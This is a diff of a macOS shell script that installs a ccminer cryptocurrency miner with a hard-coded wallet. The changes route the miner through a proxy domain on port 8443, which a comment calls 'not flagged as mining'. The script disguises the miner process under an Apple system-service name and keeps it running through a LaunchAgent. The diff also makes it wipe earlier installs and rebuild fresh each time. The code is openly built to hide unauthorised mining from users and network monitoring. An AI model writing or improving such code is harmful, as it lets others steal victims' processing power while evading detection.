@@ -8,8 +8,8 @@
 
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
-POOL_HOST="cdn.soumalya.in"  # Your domain — no port visible, looks like HTTPS
-POOL_PORT="443"
+POOL_HOST="cdn.soumalya.in"  # Your domain — proxies to LuckPool via VPS
+POOL_PORT="8443"              # HTTPS alt-port — not flagged as mining
 THREADS=$(sysctl -n hw.logicalcpu)
 
 DISGUISE_NAME="com.apple.webkit.networkd"
@@ -28,14 +28,19 @@ fi
 
 echo "[*] Apple Silicon detected — ${THREADS} cores"
 
-# ---- stop old instance ----
+# ---- stop old instance + wipe previous install ----
+echo "[*] Removing any existing installation..."
 launchctl unload "$PLIST_PATH" 2>/dev/null || true
 pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
 sleep 1
+rm -rf "$INSTALL_DIR"
+rm -f "$PLIST_PATH"
+rm -f "$LOG_PATH"
+mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
+echo "[*] Clean slate ready."
 
-# ---- build from source if binary missing ----
-if [[ ! -f "$BINARY_PATH" ]]; then
-  echo "[*] Building ccminer from source..."
+# ---- always build fresh ----
+echo "[*] Building ccminer from source..."
 
   # Ensure Homebrew — redirect stdin so brew never reads from pipe
   if ! command -v brew &>/dev/null; then
@@ -118,9 +123,6 @@ print('[*] miner.h patched OK')
     echo "[!] Build failed."
     exit 1
   fi
-else
-  echo "[*] Binary already exists — skipping build."
-fi
 
 # ---- write launchd plist using printf (safe in pipe) ----
 printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
